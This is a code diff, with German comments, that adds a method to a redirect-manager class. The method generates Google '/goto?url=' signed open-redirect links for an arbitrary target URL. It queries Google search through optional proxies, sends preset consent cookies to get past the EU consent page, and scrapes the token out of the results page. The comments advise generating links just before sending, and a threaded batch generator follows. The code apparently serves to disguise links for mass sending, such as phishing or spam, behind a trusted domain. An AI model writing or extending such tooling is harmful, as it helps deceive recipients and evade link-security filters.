@@ -178,6 +178,57 @@ class RedirectManager:
             return None
 
     @staticmethod
+    def _generate_one_goto(target_url: str, proxy: str = "") -> Optional[str]:
+        """Google `/goto?url=<token>` — signed open-redirect. Generiert
+        indem die Ziel-URL als Suchanfrage geschickt wird und der resultierende
+        goto-Link aus der SERP-HTML extrahiert wird.
+
+        Gültigkeit laut Beobachtung: 1-3 Tage. TTL steckt im Token, nicht
+        beeinflussbar von uns — kurz vor Send generieren.
+        """
+        import re as _re
+        from urllib.parse import quote as _quote
+        headers = dict(HEADERS)
+        # Google gibt für einige User-Agents keinen goto-Link zurück
+        # (Mobile-View / GDPR-Consent-Wall). Firefox-Desktop-UA + deutsche
+        # Sprache liefert am zuverlässigsten den "Wolltest du diese Seite
+        # aufrufen?"-Kasten.
+        headers["Accept"] = "text/html,application/xhtml+xml"
+        # NCR + Consent-Cookie umgehen die EU-Consent-Wall die sonst statt
+        # der SERP kommt. hl=de → deutsches UI (bei manchen Locales
+        # ist der /goto-Kasten sonst nicht drin).
+        cookies = {"CONSENT": "PENDING+987", "SOCS": "CAESHAgBEhIaAB"}
+        url = f"https://www.google.com/search?q={_quote(target_url, safe='')}&hl=de&gl=de"
+        kwargs = {"headers": headers, "cookies": cookies,
+                  "timeout": 20, "allow_redirects": True}
+        if proxy and proxy.strip():
+            p = _normalize_proxy(proxy.strip())
+            if p:
+                kwargs["proxies"] = {"http": p, "https": p}
+        try:
+            resp = _requests.get(url, **kwargs)
+            resp.raise_for_status()
+            html = resp.text
+            # Google escapet URLs in HTML z.T. mit &amp;, aber /goto?url=
+            # ist parameter-frei bis zum Token-Ende. Token = base64url +
+            # gelegentlich am Ende '=' (URL-encoded oder blank).
+            # Muster: /goto?url=<CAESE...bis " oder & oder <>
+            m = _re.search(r'/goto\?url=([A-Za-z0-9_\-]+={0,3})', html)
+            if not m:
+                # Fallback: Google escapet Slashes manchmal als \x2f
+                m = _re.search(r'\\x2fgoto\\x3furl\\x3d([A-Za-z0-9_\-]+={0,3})',
+                                html)
+            if not m:
+                logger.warning("Google /goto: kein Token in SERP für %s",
+                                target_url[:80])
+                return None
+            token = m.group(1)
+            return f"https://www.google.com/goto?url={token}"
+        except Exception as exc:
+            logger.error("Google /goto error: %s", exc)
+            return None
+
+    @staticmethod
     def generate_batch_threaded(target_url: str, count: int, threads: int = 5,
                                  callback=None) -> List[str]:
         results: List[str] = []
